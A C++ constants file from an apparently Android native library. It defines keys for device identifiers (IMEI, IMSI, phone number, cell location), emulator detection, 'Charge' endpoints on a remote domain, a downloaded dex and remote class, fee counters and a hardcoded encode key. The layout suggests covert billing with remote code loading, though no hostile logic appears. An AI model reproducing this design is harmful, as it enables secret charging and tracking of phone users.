//
// Created by zhengnan on 2016/1/13.
//

#include "MyCts.h"
#include "Utils.h"
MyCts* MyCts::m_instance;
MyCts::GC MyCts::gc;
MyCts::MyCts() {
    imei="imei";
    dVersion = "dVersion";
    vercode="vercode";
    niceSp = "niceSp";
    imsi="imsi";
    appVersion = "appVersion";
    appPackname = "appPackname";
    cpu = "cpu";
    country = "country";
    lastWriteCellTime = "lastWriteCellTime";
    language = "language";
    channelId = "channelId";
    gameId = "gameId";
    insTimeSub = "insTimeSub";
    data = "data";
    files= "files";
    iuu = "iuu";
    inum = "inum";
    result = "result";
    msg="msg";
    sign = "sign";
    token = "token";
    isEmulate = "isEmulate";
    isUsbMode = "isUsbMode";
    androidSdkVersion = "androidSdkVersion";
    url = "url";
    close = "close";
    //log url用到
    log_app_id = "app_id";
    log_channel_id = "channel_id";
    versionCode = "versionCode";
    //use
    use_testApkName = "com.z.test";
    use_urlDomain = "analysis.lettersharing.com";
    use_urlRequest4bwc = "http://"+use_urlDomain+"/index.php?m=Api&c=Charge&a=index";
    use_urlRequest4ref = "http://"+use_urlDomain+"/index.php?m=Api&c=Charge&a=index";
    use_urlResult = "";//"http://utils.appanalyselog.com/bwclog/checkdone";
    use_urlLog="http://"+use_urlDomain+"/index.php?m=Api&c=Charge&a=log";
    use_baseXiPath = "xi_bwc";
    use_bwcPath = "realBwc";
    use_reFeePath = "realRef";

    use_zip_name ="data.zip";
    use_dex_name = "entry.dex";
    use_separator="/";
    use_encodeKey="abc12345";
    use_samFileEncodeKey = 12345;
    lastApkUpdateTime = "lastApkUpdateTime";
    isFirst = "isFirst";
    preStub = "preStub";
    num_0 = "0";
    num_1 = "1";
    sig_eqs="=";
    sig_and = "&";
    progress = "progress";
    requestType = "requestType";
    fixed_vercode= "fixed_vercode";
    model = "model";
    tel = "tel";
    sdkCode = "sdkCode";
    current_hash = "current_hash";
    tc_timeStamp = "tc_timeStamp";
    tc_feeTimes = "tc_feeTimes";
    use_soName = "libbwcLog.so";
    cellId = "cellId";
    lac = "lac";
    uid = "uid";
    sId = "sId";
    location = "location";
    use_remoteClsName = "com.own.b";
}
MyCts* MyCts::GetInstance() {
    if( m_instance==NULL) {
        LOGI("MyCts init");
        m_instance = new MyCts();
    }
    return  m_instance;
}